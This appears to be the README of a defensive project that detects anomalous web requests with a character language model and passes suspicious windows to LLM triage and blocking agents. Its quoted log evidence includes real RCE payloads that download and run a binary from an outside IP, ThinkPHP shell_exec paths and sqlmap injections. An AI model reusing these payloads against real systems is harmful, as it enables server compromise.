## The dataset

[Web Server Access Logs (labeled)](https://www.kaggle.com/datasets/eliasdabbas/web-server-access-logs),
9,281,184 real requests to the Iranian e-commerce site zanbil.ir, in Combined Log
Format with an added `type` column.

| type | rows | share |
|---|---:|---:|
| benign | 9,279,228 | 99.968% |
| bot | 1,526 | 0.016% |
| sqli | 721 | 0.008% |
| scanning | 474 | 0.005% |
| rce | 235 | 0.003% |

Three facts about this distribution shaped every decision downstream:

**0.032% positives.** Accuracy is useless at this rate — a model that answers
"benign" always scores 99.97%. PR-AUC and recall at a fixed false positive rate are
the only informative metrics.

**The 721 SQLi events come from 2 IP addresses.** A single sqlmap session. A random
train/test split would put the same payload from the same attacker on both sides and
report a recall that measures memorization, not detection. Every split in this
project is by IP.

**`bot` is 52% of the positive class and is not an attack.** MJ12bot, DotBot and
Mail.RU_Bot requesting `/robots.txt`, labeled `label=1`. A system that trusts this
label blocks search crawlers.

`labeled.csv` is 2.8 GB and is not committed. `scripts/sample_dataset.py` derives
`data/sample.csv.gz` (12 MB, 303,344 events): 100% of the attacks plus a uniform
subsample of the benign traffic, which brings the attack rate to 0.97%. Since the
detector scores one request at a time, dropping benign rows distorts nothing — what
matters is the diversity of normal URLs, and 300 thousand cover the site's
vocabulary comfortably.

## The finding that defined the architecture

The first version of this project trained a supervised classifier on those labels.
The second discarded it. That is the most important engineering decision here, so it
is worth showing the evidence.

### The labels were generated by regex

The dataset documentation states the labeling used *rule-based keyword heuristics*.
Confirming on the samples: `/robots.txt` with a crawler user agent becomes `bot`;
`UNION ALL SELECT` becomes `sqli`; `/wp-login.php` becomes `scanning`.

Training supervised on those labels is circular: the model learns to imitate the
regex, and at best approximates it with error. The numbers confirm it:

| | recall | precision | false positives |
|---|---:|---:|---:|
| 15-line regex | 0.844 | 0.997 | 3 |
| Supervised classifier | 0.911 | 0.835 | 215 |

The supervised model trades precision for recall and ties on F1 with a grep. It is
not a better detector; it is a different operating point on the same detector.

### The error audit was worse than the numbers

Auditing the supervised model's 215 false positives against independent attack
signatures showed only 3.6% of them were attacks the labeler missed. The other 96%
were noise:

```
[0.294] GET 200 /browse/dishwasher/ماشین-ظرفشویی      UA: MSIE 9.0
[0.350] GET 200 /filter?f=p1392&page=9                UA: MSIE 5.01
[0.498] GET 302 /filter?f=p6,b8,stexists&o=st         UA: Cloudflare-AMP/1.0
```

Legitimate browsing, filter pagination, the Cloudflare fetcher. The model had
learned that a long URL with many parameters and an old user agent is suspicious.

And it missed trivial attacks:

```
[0.100] type=sqli  /image/{{basketItem.id}}?type=(SELECT CONCAT(0x7171767871,...))
```

`SELECT CONCAT(0x71...)` is literal sqlmap, scored 0.10.

### The problem was the formulation, not the dataset

The way out is not a different dataset. Switching to network traffic would reproduce
the same problem with different features if the new dataset's labels also come from
a rule. What breaks the circularity is **not using the label in training**.

The challenge brief asks for detection of *anomalous behavior*. Anomaly detection is
unsupervised. The first version had drifted away from that by chasing the label.

The hypothesis tested: the signal lives in the character structure of the URL —
char n-grams are what took the supervised model to high PR-AUC. If it is there, a
character model fitted on benign traffic alone should find it without ever seeing a
label. And since no attack enters the fit, every family becomes zero-shot by
construction.

The hypothesis held. `scripts/experiment_novelty.py` preserves that experiment.

## The model

A character n-gram language model, order 4, with interpolated backoff.

For each character `c` in a context `h`, the mixed probability is

```
P(c|h) = Σ  w_k · (count(h_k + c) + k) / (count(h_k) + k·|V|)
        k=0..3
```

where `h_k` is the length-`k` suffix of the context, `w = (0.4, 0.3, 0.2, 0.1)`
normalized, `k = 0.1` is add-k smoothing and `|V|` is the observed alphabet. The
score of a string is the mean negative log-likelihood per character:

```
score(s) = -(1/|s|) · Σ log₂ P(sᵢ | s₁..sᵢ₋₁)
```

Design choices that matter:

**Per-character normalization.** Without it every long URL would score high and the
model would be a disguised length meter. Section
[Confounds](#confounds-eliminated-by-measurement) shows the measurement that
confirms it is not.

**Interpolated backoff instead of pure order 4.** Long context is more informative
when it exists, but most of the time it does not; falling back to shorter orders is
what keeps unseen-but-normal URLs from scoring high.

**Exact memoization.** Every lower-order context is a suffix of the order-4 window,
so caching per window is exact. Scoring 500 events takes 10 ms.

**`freeze()` before serializing.** A pickled `defaultdict` carries its factory and
starts growing again on every missing-key lookup — a silent memory leak in a
long-running service. `fit()` converts to plain dicts.

**Normalized score with the threshold at 0.5.** The exposed score is
`raw / threshold / 2`, capped at 0.999. Pinning the cutoff at 0.5 decouples the
correlator, the API and the agents from the model's NLL scale: changing the
operating point, or the whole detector, recalibrates nothing downstream.

**Span localization.** `explain()` slides a 16-character window over the per-character
NLL vector and returns the worst one. This is what turns a number into evidence the
agent can quote. For the RCE payload
`wget http://217.61.5.226/bins/Solstice.mips -O -> /tmp/.Solstice;chmod 777` it
returns `'ps -O -> /tmp/.S'`.

## Methodology

```
train IPs, benign events   ->  80% fit (120,000 URLs), 20% threshold calibration (30,000)
held-out IPs, all events   ->  evaluation (93,023 events, 1,195 attacks)
```

**No positive label enters the fit.** `UrlNoveltyModel.fit` accepts a list of
strings and nothing else — there is no API through which a label could leak. A test
asserts that signature.

**Threshold calibrated on a slice separate from the fit.** Calibrating on the fit
set would report an optimistic false positive rate, because the model has already
seen those exact strings.

**Split by IP, partitioned per attack type.** A plain group split could send both
SQLi origins to the same side and zero the class out of the test set. Types are
split separately, starting with the rarest.

**The published operating-point table uses calibration-set thresholds.** An earlier
version of this table took the quantile from the test set itself — oracle
calibration, optimistic exactly where the decision is made. It promised recall 0.848
at 0.05% FPR where the service delivers 0.563. Fixed.

## Results

### Default operating point, 0.2% FPR

| metric | value |
|---|---:|
| Event recall | 0.9883 |
| Incident recall | 0.9972 |
| Precision | 0.8620 |
| PR-AUC | 0.9698 |
| ROC-AUC | 0.9994 |
| Effective FPR | 0.2058% |
| False positives | 189 |
| False negatives | 14 |

### Why incident recall is the metric that matters

A dossier carries the IP's whole five-minute window, not only the events above the
floor. An event that escapes is not a lost attack when another event from the same
IP in the same window was flagged — the agent reads both. The unit of analysis is
the window, so that is where recall has to be measured.

Of the 362 windows containing an attack, 361 produce a dossier. Of the 1,195 attack
events, 1,194 end up inside a dossier an agent reads.

This is also why the operating point is 0.2% and not 0.1%: at 0.1% the event recall
is 0.9305 and eight entire windows of WordPress probing produce no dossier at all.

```
IP 23.228.96.82     4.3165  /wp-content/plugins/wp-easy-gallery-pro/admin/php.php
IP 91.208.99.2      4.2811  /wordpress/wp-admin/
IP 192.185.176.102  4.3295  /blog/wp-admin/
IP 23.228.96.82     4.3887  /wp-content/plugins/dzs-zoomsounds/admin/upload.php
IP 93.63.66.201     4.0459  /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
```

All just below the 4.5156 threshold. At 0.2% the threshold drops to 4.2419 and they
are caught.

And it is why the operating point is not more permissive than 0.2%: at 0.5% the
event recall rises to 0.9992 but incident recall does not move, because the
recovered events sit in windows already escalated. The cost is 39% more dossiers for
zero additional incident coverage.

### Score distribution overlap

| statistic | value |
|---|---:|
| Benign median | 0.257 |
| Benign 99.9th percentile | 0.524 |
| Benign maximum | 0.711 |
| Attack 10th percentile | 0.541 |
| Attack median | 0.585 |
| Benign requests above the attack median | 16 |

The distributions overlap. The highest-scoring benign request outranks the median
attack. This is the measured justification for the whole agent layer: the score says
"improbable", not "malicious", and no threshold on it can say otherwise.

It is also why the deterministic fallback never issues a `malicious` verdict and
caps its confidence at 0.6.

## Confounds eliminated by measurement

Two alternative explanations were tested before accepting the result.

**The model could be a length meter.** A baseline using only URL length achieves
recall 0.000 at 1% FPR and PR-AUC 0.082. The correlation between score and length is
-0.011.

**The model could be detecting a frontend artifact.** The SQLi URLs contain
`{{basketItem.id}}`, an uninterpolated template placeholder. But it appears in 1,234
benign URLs against 670 SQLi ones, so it is not a campaign marker. Stronger still:
removing the artifact *raises* the SQLi score (median 5.94 → 6.40), while the
artifact alone, with no SQL, scores 2.22 — below the threshold. The model detects the
SQL, not the artifact.

## Error profile

### False positives

All 189 were audited against independent attack signatures. **None** trips one. They
are genuinely unusual and genuinely benign traffic:

```
[0.711] 302 /customer/activate/130910?code=MTA6MTc6MjMgUE1fYWN0aXZhdGVfMTMwOTEw
            least likely span: 'aXZhdGVfMTMwOTEw'
[0.657] 200 /m/search/HUAWEl-V-NSL21
[0.638] 200 /filter/p40,1483|پوشال دو طرف دوخت
[0.621] 200 /m/filter/588|گنجایش کتری شیشه‌ای: 2 لیتر,p10
```

Base64 activation codes, Persian searches, catalog filters carrying a unit of
measure. An analyst would agree they are structurally atypical and not attacks —
which is exactly the judgment the triage agent makes. Compare with the supervised
model's false positives, which were catalog pagination.

### False negatives

14 at event level: 12 sqli, 2 scanning. All pressed against the floor:

```
[0.499] type=sqli  /image/{{basketItem.id}}?type=productModel' UNION ALL SELECT NULL#&wh=50x50
[0.495] type=sqli  /image/{{basketItem.id}}?type=productModel&wh=50x50 UNION ALL SELECT NULL#
```

Textbook SQLi lost to a calibration margin, not to blindness — the same payload with
one more quote scores 0.531 and is detected. All 12 come from the two sqlmap IPs,
whose windows are already escalated by other events, so none of them fails to reach
an agent.

This is the concrete reason the calibration table travels inside the artifact:
`NOVELTY_TARGET_FPR=0.005` recovers them without retraining. A test asserts it.

## The one incident that is not escalated

One window in 362, and it is the honest limit of the approach:

```
79.127.28.1  2019-01-24 05:08:51  GET /images/.png  HTTP/1.1  200  size=0
referrer: https://www.zanbil.ir/filter/p63,rt1000000
UA: Mozilla/5.0 (Windows NT 6.1; Win64; x64) Chrome/71.0.3578.98 Safari/537.36
label=1  type=scanning
```

It occurs exactly once in the 9.28 million events of the full dataset. It returned
200 with an empty body, the referrer is a filter page on the site itself, the user
agent is a real Chrome, and the IP's other six requests in the same window are a
font, a logo and product images. Its score is 2.268 — lower than
`/site/alexaGooleAnalitic` at 2.500, a legitimate request from the same window.

It is a broken `<img src="/images/.png">` tag, and the regex labeler marked it as
scanning.

Escalating it would need a threshold of 2.268, which flags 34,129 of 91,828 benign
requests — 37% FPR. No cheap orthogonal signal reaches it either, because it
returned 200:

| escalation rule | dossiers | windows missed | event precision |
|---|---:|---:|---:|
| content at 0.2% FPR | 532 | 1 | 0.862 |
| content OR 4xx with unseen path | 653 | 1 | 0.790 |
| content OR any 404 | 1,849 | 1 | 0.514 |
| content OR path never seen in training | 5,416 | **0** | 0.157 |

Literal zero costs 10.2× the triage load and makes the agents spend 84% of their
calls on benign traffic, to reach a broken image tag. On real attack traffic the
incident recall is 1.000.

## Architecture internals

```
  Security analyst / SIEM
              │  POST /analyze   (X-API-Key)
              ▼
  ┌───────────────────────────────────────────────┐
  │  FastAPI   /analyze  /incidents  /blocklist   │
  └───────────────────────────────────────────────┘
              │
              ▼
  [1] NORMALIZATION AND SCORING     deterministic, 10 ms for 500 events
      parser → character model fitted on benign traffic
      normalized score: 0.50 is the escalation floor
              │
              ├── nothing above the floor ──▶ 200 {"threat_detected": false,
              │                                    "events_near_threshold": n}
              │                               zero LLM calls
              ▼
  [2] CORRELATION                   deterministic
      groups suspects into dossiers by (IP, 5-minute window)
      attaches the improbable span to the 5 highest-scoring events
              │
              ▼
  [3] TRIAGE AGENT                  LLM · 1 call per incident
      read-only tools → verdict, severity, MITRE, confidence
              │
              ▼
  [4] ACTION AGENT                  LLM · 1 call per non-benign incident
      actuation tools → block / rate_limit / alert / monitor / allow
              │                                  │
              ▼                                  ▼
      SQLite (analyses, incidents,       Pluggable actuators
      actions, blocklist)                (dry-run by default)
```

### Why the funnel

Sending every log event to an LLM is unviable in cost and latency, and unnecessary —
99% of traffic is ordinary browsing.

The LLM never sees raw events in volume. It sees *dossiers*. A dossier is the summary
of one (IP, 5-minute window) pair: aggregate statistics, status distribution, most
frequent paths, user agents, and the five least likely events, each with the span the
model pointed at. Three hundred requests from one IP become under 4,000 characters —
a test guarantees that property.

The dossier carries the whole window, not just the suspicious events. Knowing an IP
made 2 improbable requests among 400 normal ones is different from knowing it made 2
out of 2.

### The division of labor between layers

The detector answers "this does not look like this site's normal traffic". It does
not answer "this is an attack", and the difference is not rhetorical — see the
distribution overlap above.

Telling unusual legitimate traffic apart from an attack takes context: knowing that
`?code=MTA6MTc6MjMgUE1f...` is a base64 activation code and that
`دو-عامل-مهم-که-ن` is a Persian blog post title. That judgment is what the triage
agent delivers, and it is why the statistical layer is deliberately high-recall.

### The zero-false-negative policy in code

The two error classes are not symmetric. A false positive costs one unit of triage,
and there is a layer dedicated to performing that triage. A false negative costs an
incident nobody sees. Four places implement that asymmetry:

| decision | consequence |
|---|---|
| Floor at 0.2% FPR, not 0.1% | Incident recall 0.997 instead of 0.978, at 7.6 points of precision |
| The deterministic path never emits `benign` | Without an LLM the verdict is `suspicious` with confidence ≤ 0.6; nothing is closed |
| A crawler user agent is an annotation, not an exemption | The field belongs to the client; `User-Agent: Googlebot` plus a payload gets no free pass |
| A batch without incidents reports the near-miss band | `events_near_threshold` states how many landed within 10% of the floor |

True negatives still exist and are legitimate — they are 99.8% of traffic, and a
genuinely clean batch returns `allow`. What does not exist is a benign verdict issued
by a rule about an incident that was already escalated.

The only point in the system where traffic stops being examined is the correlator's
floor: a window with no event above it produces no dossier. That is why the floor is
chosen by measured incident recall rather than by taste.

### Severity derived from calibration

Severity used to be `score >= 0.66` for high and `>= 0.56` for medium, measured at
the 0.1% FPR distribution. Since the normalized score is a ratio over the *current*
threshold, moving the operating point shifted every score and left those constants
silently out of date.

Now the bands come from the calibration table: `high` means the event would still be
flagged at 0.02% FPR, `medium` at 0.1%. That is a measured statement, and it tracks
the threshold automatically.

## The two agents

Both run on the same hand-written loop in `app/agents/base.py`, over either
Anthropic (`claude-opus-5`) or Gemini (`gemini-3.5-flash`). Each declares a
**terminal tool**: when the model calls it, the loop ends and the tool's arguments are
the structured result. That replaces free-text parsing with a contract validated by the
tool's own JSON schema, and gives a deterministic stopping criterion.

The loop is provider-agnostic because it targets one client surface —
`client.messages.create(...)` returning `.stop_reason` and a `.content` list of blocks.
`app/agents/providers.py` translates that surface onto the Gemini REST API, so neither
the tools nor the prompts change when the provider does.

### Verified output

Real run against Gemini, one ThinkPHP RCE request:

```
analyzed by: llm | verdict: malicious / critical | confidence: 1.0
types: ['rce'] | MITRE: ['T1190'] | action: block

The source IP 185.244.25.221 made a request attempting to exploit a known ThinkPHP
v5.x Remote Code Execution vulnerability. Specifically, it used the path
/index.php?s=/index/think/invokefunction to invoke call_user_func_array and execute
shell_exec to download a malicious binary (wget http://185.244.25.221/bins/x86 -O
/tmp/.x) and make it executable (chmod 777 /tmp/.x). The request returned a status
of 200 OK with a response size of 4096 bytes, which represents a highly severe
attack that may have succeeded depending on the underlying framework.

actions:
  - block -> 185.244.25.221 | executed=False | recorded in the blocklist; no system change
  - alert -> 185.244.25.221 | executed=True  | alert delivered
```

Two things there come from the agent and not from the detector: the framework
identification, and the observation about the 200-with-4096-bytes response. In an
earlier run on a four-event sqlmap window, triage noticed the 200 responses were
exactly 5667 bytes — the size of a normal image response — and concluded the injections
had probably not succeeded. That is the judgment the statistical layer cannot make.

### Triage agent

| tool | purpose |
|---|---|
| `get_sample_events` | Pull raw events the summary truncated |
| `search_events` | Regex search across the window's URLs and user agents |
| `count_by_field` | Aggregate by status, method, path or user agent |
| `get_ip_history` | Query the IP's previous incidents from the database |
| `submit_verdict` | Terminal: verdict, severity, confidence, types, MITRE ATT&CK |

The prompt states explicitly that the score measures improbability and not malice,
and that recognized crawlers are not attacks — contradicting the dataset label. It
also states that the crawler claim only holds if the window's behavior is consistent:
a Googlebot user agent alongside `UNION SELECT` is spoofing, and the verdict follows
the behavior. Without that second half, the bypass removed from the deterministic
path would return through the prompt.

### Action agent

| tool | purpose |
|---|---|
| `check_blocklist` | Avoid redundant action |
| `get_ip_history` | Recidivism justifies escalating |
| `block_ip` | Add to blocklist; dry-run by default |
| `rate_limit` | Throttle without cutting access |
| `send_alert` | Telegram, falling back to the log |
| `submit_action_plan` | Terminal: final action and rationale |

Two agents rather than one because whoever classifies should not decide, and whoever
decides should not reclassify. It keeps each prompt short, allows auditing the verdict
independently of the action, and avoids the agent rationalizing a classification to
justify an action already taken.

## Cost control

| mechanism | effect |
|---|---|
| Deterministic funnel | 500 events → 1 to 6 incidents |
| Call budget (`LLM_CALL_BUDGET`) | The excess falls back to the deterministic path |
| Prompt caching | System prompt and tools are identical across calls |
| Benign verdict ends early | A benign incident does not invoke the action agent |

At 0.2% FPR the load is roughly 57 dossiers per 10,000 events against a default
budget of 12 calls. The excess falls back to the deterministic path — which closes
nothing, so nothing is lost, but most incidents receive only the weak verdict. The
budget therefore acts as an explicit priority queue: dossiers arrive sorted by score,
and `incidents_awaiting_agent` reports how many did not get an agent.

Those dossier counts come from a sample that over-represents attacks by about 30×
(0.97% against 0.032% in the full dataset). On real traffic the volume is governed by
the false positive rate, not the attack rate.

## Known limits

**The agent path is verified against Gemini, not against Anthropic.** Both agents
were exercised end to end over the real Gemini API (`gemini-3.5-flash`): triage
returned `malicious / critical` with `mitre_techniques: ["T1190"]` for a ThinkPHP RCE,
and the action agent chose `block`, wrote its own alert and delivered it to Telegram.
Two adapter bugs were found only by that run and could not have been caught by the
test doubles — a retired default model, and Gemini 3's requirement that
`thoughtSignature` be echoed back on every function call.

The Anthropic path remains unexercised: no credential was available. It uses the same
loop and the same tools, and the request parameters follow the documentation for
`claude-opus-5` (adaptive thinking, `output_config.effort`, no `temperature`), but no
real request was ever issued through it.

**`scanning` remains the family with the worst ranking.** Recall 0.987 but PR-AUC
0.620 — the hits come from being above the floor, not from ranking well. Paths like
`/wp-login.php` are short and structurally similar to normal URLs. A user-agent model
was tested to cover that case and rejected by measurement: at the current operating
point it loses 8.2 points of precision and drops PR-AUC from 0.970 to 0.761.

**Event precision is 0.862, below the regex's.** That is a chosen consequence of the
policy, not a defect: the floor is calibrated not to lose incidents. Anyone who
prefers precision over recall changes one environment variable.

**The score measures improbability, not malice.** The distributions overlap. The
system depends on the agents for that distinction, and the deterministic path is
explicit about being unable to make it.

**The model is specific to this site.** It learned zanbil.ir's URL vocabulary.
Applied to another domain it must be refitted on that domain's benign traffic — which
is fast and needs no labels, but is not transferable for free.

**No external dataset evaluation.** A validation on data whose labels have an
independent origin — CICIDS2017, where labels come from a real attack execution
schedule — would measure generalization more convincingly. It was not done.
